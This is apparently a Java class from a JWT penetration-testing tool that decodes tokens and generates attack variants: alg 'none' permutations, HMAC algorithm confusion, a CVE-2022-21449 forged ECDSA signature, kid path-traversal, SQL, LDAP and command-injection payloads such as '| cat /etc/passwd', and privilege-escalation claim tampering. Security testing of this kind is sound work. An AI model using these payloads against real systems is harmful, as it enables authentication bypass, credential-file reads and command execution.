package com.jwtlens;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Immutable JWT token representation with decode, encode, and manipulation capabilities.
 * All mutation methods return new JwtToken instances.
 */
public class JwtToken {

    public static final Pattern JWT_PATTERN = Pattern.compile(
            "(ey[a-zA-Z0-9_=]+)\\.(ey[a-zA-Z0-9_=\\-]+)\\.([a-zA-Z0-9_\\-+/=]*)"
    );

    private static final Gson GSON = new GsonBuilder().disableHtmlEscaping().create();
    private static final Base64.Decoder B64_DECODER = Base64.getUrlDecoder();
    private static final Base64.Encoder B64_ENCODER = Base64.getUrlEncoder().withoutPadding();

    private final LinkedHashMap<String, Object> header;
    private final LinkedHashMap<String, Object> payload;
    private final String signature;
    private final String rawToken;
    // Preserved original base64url parts for signing input — re-encoding from Map
    // may alter key ordering and break HMAC verification (brute force, active checks).
    private final String rawSigningInput;

    public JwtToken(String encodedJwt) {
        String[] parts = encodedJwt.split("\\.", -1);
        if (parts.length != 3) {
            throw new IllegalArgumentException("Invalid JWT format: expected 3 parts, got " + parts.length);
        }
        this.header = decodeJson(parts[0]);
        this.payload = decodeJson(parts[1]);
        this.signature = parts[2];
        this.rawToken = encodedJwt;
        this.rawSigningInput = parts[0] + "." + parts[1];
    }

    private JwtToken(LinkedHashMap<String, Object> header, LinkedHashMap<String, Object> payload, String signature) {
        this.header = deepCopy(header);
        this.payload = deepCopy(payload);
        this.signature = signature;
        String h = encodepart(this.header);
        String p = encodepart(this.payload);
        this.rawSigningInput = h + "." + p;
        this.rawToken = rawSigningInput + "." + this.signature;
    }

    // ======================== STATIC HELPERS ========================

    public static List<JwtToken> extractFromString(String text) {
        List<JwtToken> tokens = new ArrayList<>();
        if (text == null || text.isEmpty()) return tokens;
        Matcher matcher = JWT_PATTERN.matcher(text);
        while (matcher.find()) {
            try {
                tokens.add(new JwtToken(matcher.group()));
            } catch (Exception ignored) {
            }
        }
        return tokens;
    }

    public static List<JwtLocation> extractWithLocation(String text) {
        List<JwtLocation> results = new ArrayList<>();
        if (text == null || text.isEmpty()) return results;
        Matcher matcher = JWT_PATTERN.matcher(text);
        while (matcher.find()) {
            try {
                JwtToken token = new JwtToken(matcher.group());
                results.add(new JwtLocation(token, matcher.start(), matcher.end(), matcher.group()));
            } catch (Exception ignored) {
            }
        }
        return results;
    }

    // ======================== GETTERS ========================

    public String encode() {
        return rawToken;
    }

    public String getSigningInput() {
        // Always use the preserved original — re-encoding from Map changes key ordering
        // and breaks HMAC verification (brute force, passive checks, active checks).
        return rawSigningInput;
    }

    public String getEncodedHeader() {
        return encodepart(header);
    }

    public String getEncodedPayload() {
        return encodepart(payload);
    }

    public String getSignature() {
        return signature;
    }

    public byte[] getSignatureBytes() {
        if (signature == null || signature.isEmpty()) return new byte[0];
        return B64_DECODER.decode(padBase64(signature));
    }

    public Map<String, Object> getHeader() {
        return Collections.unmodifiableMap(header);
    }

    public Map<String, Object> getPayload() {
        return Collections.unmodifiableMap(payload);
    }

    public Optional<String> getAlg() {
        Object alg = header.get("alg");
        return alg instanceof String ? Optional.of((String) alg) : Optional.empty();
    }

    public Optional<String> getKid() {
        Object kid = header.get("kid");
        return kid instanceof String ? Optional.of((String) kid) : Optional.empty();
    }

    public Optional<String> getJku() {
        Object jku = header.get("jku");
        return jku instanceof String ? Optional.of((String) jku) : Optional.empty();
    }

    public Optional<String> getX5u() {
        Object x5u = header.get("x5u");
        return x5u instanceof String ? Optional.of((String) x5u) : Optional.empty();
    }

    public Optional<Object> getX5c() {
        return Optional.ofNullable(header.get("x5c"));
    }

    public Optional<Object> getJwk() {
        return Optional.ofNullable(header.get("jwk"));
    }

    public Optional<String> getTyp() {
        Object typ = header.get("typ");
        return typ instanceof String ? Optional.of((String) typ) : Optional.empty();
    }

    public Optional<String> getHeaderString(String key) {
        Object val = header.get(key);
        return val instanceof String ? Optional.of((String) val) : Optional.empty();
    }

    public Optional<String> getClaimString(String key) {
        Object val = payload.get(key);
        return val instanceof String ? Optional.of((String) val) : Optional.empty();
    }

    public Optional<Long> getClaimLong(String key) {
        Object val = payload.get(key);
        if (val instanceof Number) {
            return Optional.of(((Number) val).longValue());
        }
        return Optional.empty();
    }

    public boolean hasHeader(String key) {
        return header.containsKey(key);
    }

    public boolean hasClaim(String key) {
        return payload.containsKey(key);
    }

    // ======================== TOKEN PROPERTY CHECKS ========================

    public boolean hasExpiry() {
        return payload.containsKey("exp");
    }

    public boolean isExpired() {
        return getClaimLong("exp").map(exp -> exp < Instant.now().getEpochSecond()).orElse(false);
    }

    public Optional<Long> getExp() {
        return getClaimLong("exp");
    }

    public Optional<Long> getIat() {
        return getClaimLong("iat");
    }

    public Optional<Long> getNbf() {
        return getClaimLong("nbf");
    }

    public boolean hasSymmetricAlg() {
        return getAlg().map(a -> a.startsWith("HS")).orElse(false);
    }

    public boolean hasAsymmetricAlg() {
        return getAlg().map(a ->
                a.startsWith("RS") || a.startsWith("ES") || a.startsWith("PS")
        ).orElse(false);
    }

    public boolean hasRsaAlg() {
        return getAlg().map(a -> a.startsWith("RS") || a.startsWith("PS")).orElse(false);
    }

    public boolean hasEcAlg() {
        return getAlg().map(a -> a.startsWith("ES")).orElse(false);
    }

    /**
     * Returns lifetime in seconds if both exp and iat are present.
     */
    public Optional<Long> getLifetimeSeconds() {
        Optional<Long> exp = getExp();
        Optional<Long> iat = getIat();
        if (exp.isPresent() && iat.isPresent()) {
            return Optional.of(exp.get() - iat.get());
        }
        return Optional.empty();
    }

    // ======================== MUTATION (return new JwtToken) ========================

    public JwtToken withHeader(String key, Object value) {
        LinkedHashMap<String, Object> newHeader = deepCopy(header);
        newHeader.put(key, value);
        return new JwtToken(newHeader, payload, signature);
    }

    public JwtToken withClaim(String key, Object value) {
        LinkedHashMap<String, Object> newPayload = deepCopy(payload);
        newPayload.put(key, value);
        return new JwtToken(header, newPayload, signature);
    }

    public JwtToken withRemovedHeader(String key) {
        LinkedHashMap<String, Object> newHeader = deepCopy(header);
        newHeader.remove(key);
        return new JwtToken(newHeader, payload, signature);
    }

    public JwtToken withRemovedClaim(String key) {
        LinkedHashMap<String, Object> newPayload = deepCopy(payload);
        newPayload.remove(key);
        return new JwtToken(header, newPayload, signature);
    }

    public JwtToken withSignature(String newSig) {
        return new JwtToken(header, payload, newSig);
    }

    public JwtToken withEmptySignature() {
        return withSignature("");
    }

    public JwtToken withRandomizedSignature() {
        if (signature == null || signature.isEmpty()) {
            return withSignature("invalidSig");
        }
        char[] chars = signature.toCharArray();
        Random rng = new Random();
        for (int i = chars.length - 1; i > 0; i--) {
            int j = rng.nextInt(i + 1);
            char tmp = chars[i];
            chars[i] = chars[j];
            chars[j] = tmp;
        }
        String shuffled = new String(chars);
        if (shuffled.equals(signature)) {
            return withSignature(signature + "X");
        }
        return withSignature(shuffled);
    }

    /**
     * Returns all case permutations of "none" as alg with empty signature.
     */
    public List<JwtToken> withAlgNoneVariants() {
        List<JwtToken> variants = new ArrayList<>();
        String base = "none";
        int n = base.length();
        int total = 1 << n;
        for (int i = 0; i < total; i++) {
            char[] perm = base.toCharArray();
            for (int j = 0; j < n; j++) {
                if ((i & (1 << j)) != 0) {
                    perm[j] = Character.toUpperCase(perm[j]);
                }
            }
            variants.add(withHeader("alg", new String(perm)).withEmptySignature());
        }
        return variants;
    }

    public JwtToken withAlgHs256(String secret) {
        JwtToken modified = withHeader("alg", "HS256");
        String sig = CryptoUtils.signHmac("HmacSHA256", modified.getSigningInput(), secret);
        return modified.withSignature(sig);
    }

    public JwtToken withAlgHs384(String secret) {
        JwtToken modified = withHeader("alg", "HS384");
        String sig = CryptoUtils.signHmac("HmacSHA384", modified.getSigningInput(), secret);
        return modified.withSignature(sig);
    }

    public JwtToken withAlgHs512(String secret) {
        JwtToken modified = withHeader("alg", "HS512");
        String sig = CryptoUtils.signHmac("HmacSHA512", modified.getSigningInput(), secret);
        return modified.withSignature(sig);
    }

    /**
     * For algorithm confusion: sign with HS256 using the given key bytes (e.g., RSA public key).
     */
    public JwtToken withAlgHs256Bytes(byte[] keyBytes) {
        JwtToken modified = withHeader("alg", "HS256");
        String sig = CryptoUtils.signHmacBytes("HmacSHA256", modified.getSigningInput(), keyBytes);
        return modified.withSignature(sig);
    }

    /**
     * Sign with RS256 using a private key.
     */
    public JwtToken withRs256Signature(java.security.PrivateKey privateKey) {
        JwtToken modified = withHeader("alg", "RS256");
        String sig = CryptoUtils.signRsa("SHA256withRSA", modified.getSigningInput(), privateKey);
        return modified.withSignature(sig);
    }

    /**
     * For CVE-2022-21449: ES256 with zero-value r and s.
     */
    public JwtToken withInvalidEcdsa() {
        return withHeader("alg", "ES256").withSignature("MAYCAQACAQA");
    }

    /**
     * Null bytes signature of specified length.
     */
    public JwtToken withNullSignature(int length) {
        byte[] nullBytes = new byte[length];
        return withSignature(B64_ENCODER.encodeToString(nullBytes));
    }

    /**
     * KID pointing to /dev/null, signed with empty HMAC.
     */
    public JwtToken withKidDevNull() {
        JwtToken modified = withHeader("kid", "../../../../../../../../../../../dev/null");
        return modified.withAlgHs256("");
    }

    /**
     * KID path traversal with multiple variants.
     */
    public List<JwtToken> withKidPathTraversalVariants() {
        List<JwtToken> variants = new ArrayList<>();
        String[] paths = {
                "../../../../../../../../../../../dev/null",
                "../../../../../../dev/null",
                "../../../../../dev/null",
                "../../../../dev/null",
                "/dev/null",
                "../../../../../../../../../../../etc/hostname",
                "....//....//....//....//....//....//dev/null",
                "..\\..\\..\\..\\..\\..\\..\\dev\\null",
                "/proc/sys/kernel/hostname",
                "../../../../../../proc/self/environ"
        };
        for (String path : paths) {
            JwtToken modified = withHeader("kid", path);
            variants.add(modified.withAlgHs256(""));
        }
        return variants;
    }

    /**
     * KID SQL injection variants.
     */
    public List<JwtToken> withKidSqlInjectionVariants() {
        List<JwtToken> variants = new ArrayList<>();
        String[][] payloads = {
                {"' UNION SELECT '' -- ", ""},
                {"' UNION SELECT 'AAAA' -- ", "AAAA"},
                {"' OR '1'='1", ""},
                {"' OR '1'='1' -- ", ""},
                {"1' ORDER BY 1-- ", ""},
                {"' UNION ALL SELECT 'secret' -- ", "secret"},
        };
        for (String[] entry : payloads) {
            JwtToken modified = withHeader("kid", entry[0]);
            variants.add(modified.withAlgHs256(entry[1]));
        }
        return variants;
    }

    /**
     * KID command injection variants.
     */
    public List<String> getKidCommandInjectionPayloads() {
        return List.of(
                "| sleep 5",
                "; sleep 5",
                "$(sleep 5)",
                "`sleep 5`",
                "| cat /etc/passwd",
                "; ls /",
                "& ping -c 3 127.0.0.1 &"
        );
    }

    /**
     * KID LDAP injection variants.
     */
    public List<JwtToken> withKidLdapInjectionVariants() {
        List<JwtToken> variants = new ArrayList<>();
        String[] payloads = {
                "*",
                "*)(uid=*))(|(uid=*",
                "\\00",
                "*)(objectClass=*",
        };
        for (String p : payloads) {
            variants.add(withHeader("kid", p).withAlgHs256(""));
        }
        return variants;
    }

    /**
     * Claim tampering variants for privilege escalation.
     */
    public List<JwtToken> withPrivilegeEscalationVariants() {
        List<JwtToken> variants = new ArrayList<>();

        // Admin flags
        variants.add(withClaim("admin", true));
        variants.add(withClaim("admin", "true"));
        variants.add(withClaim("admin", 1));
        variants.add(withClaim("is_admin", true));

        // Role escalation
        for (String role : new String[]{"admin", "administrator", "superuser", "root", "superadmin"}) {
            variants.add(withClaim("role", role));
            variants.add(withClaim("roles", List.of(role)));
            variants.add(withClaim("group", role));
        }

        // User ID manipulation
        variants.add(withClaim("sub", "1"));
        variants.add(withClaim("sub", "admin"));
        variants.add(withClaim("user_id", 1));
        variants.add(withClaim("user_id", "1"));
        variants.add(withClaim("uid", 0));

        return variants;
    }

    /**
     * nbf bypass: set nbf far in the future.
     */
    public JwtToken withFutureNbf() {
        long futureTime = Instant.now().getEpochSecond() + 86400;  // 24 hours from now
        return withClaim("nbf", futureTime);
    }

    // ======================== DISPLAY HELPERS ========================

    public String getDecodedHeaderJson() {
        return GSON.toJson(header);
    }

    public String getDecodedPayloadJson() {
        return GSON.toJson(payload);
    }

    public String getSummary() {
        StringBuilder sb = new StringBuilder();
        sb.append("<b>Header:</b><br><pre>").append(escapeHtml(getDecodedHeaderJson())).append("</pre><br>");
        sb.append("<b>Payload:</b><br><pre>").append(escapeHtml(getDecodedPayloadJson())).append("</pre>");
        return sb.toString();
    }

    /**
     * Returns a dedup key: hash of the full token.
     */
    public String getDedupKey() {
        return Integer.toHexString(rawToken.hashCode());
    }

    // ======================== INTERNAL ========================

    @SuppressWarnings("unchecked")
    private static LinkedHashMap<String, Object> decodeJson(String base64Part) {
        byte[] bytes = B64_DECODER.decode(padBase64(base64Part));
        String json = new String(bytes, StandardCharsets.UTF_8);
        return GSON.fromJson(json, new TypeToken<LinkedHashMap<String, Object>>() {}.getType());
    }

    private static String encodepart(Map<String, Object> map) {
        String json = GSON.toJson(map);
        return B64_ENCODER.encodeToString(json.getBytes(StandardCharsets.UTF_8));
    }

    @SuppressWarnings("unchecked")
    private static LinkedHashMap<String, Object> deepCopy(LinkedHashMap<String, Object> original) {
        String json = GSON.toJson(original);
        return GSON.fromJson(json, new TypeToken<LinkedHashMap<String, Object>>() {}.getType());
    }

    private static String padBase64(String input) {
        int padding = (4 - input.length() % 4) % 4;
        return input + "=".repeat(padding);
    }

    private static String escapeHtml(String text) {
        return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof JwtToken other)) return false;
        return rawToken.equals(other.rawToken);
    }

    @Override
    public int hashCode() {
        return rawToken.hashCode();
    }

    @Override
    public String toString() {
        return rawToken;
    }

    // ======================== INNER CLASS ========================

    public static class JwtLocation {
        public final JwtToken token;
        public final int startIndex;
        public final int endIndex;
        public final String rawMatch;

        public JwtLocation(JwtToken token, int startIndex, int endIndex, String rawMatch) {
            this.token = token;
            this.startIndex = startIndex;
            this.endIndex = endIndex;
            this.rawMatch = rawMatch;
        }
    }
}
